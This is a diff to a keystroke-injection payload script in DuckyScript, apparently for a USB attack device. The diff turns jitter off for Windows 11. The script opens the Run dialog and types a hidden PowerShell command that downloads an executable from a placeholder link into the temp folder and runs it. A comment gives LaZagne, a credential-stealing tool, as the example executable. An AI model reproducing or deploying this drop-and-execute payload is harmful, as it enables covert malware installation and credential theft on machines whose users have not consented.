@@ -7,10 +7,10 @@ REM Define your DDL Link and exe filename eg: Lazagne
 DEFINE #DDL your-link-here
 DEFINE #FILENAME file-name-here
 
-REM "$_JITTER_ENABLED = TRUE" can be disabled
+REM "$_JITTER_ENABLED = FALSE" can be enabled for W11 due to issues
 
 GUI r
 DELAY 500
-$_JITTER_ENABLED = TRUE
+$_JITTER_ENABLED = FALSE
 STRING powershell.exe -WindowStyle Hidden -Command Invoke-WebRequest -Uri '#DDL' -OutFile $env:temp\#FILENAME.exe; Start-Process $env:temp\#FILENAME.exe; Exit"
 ENTER
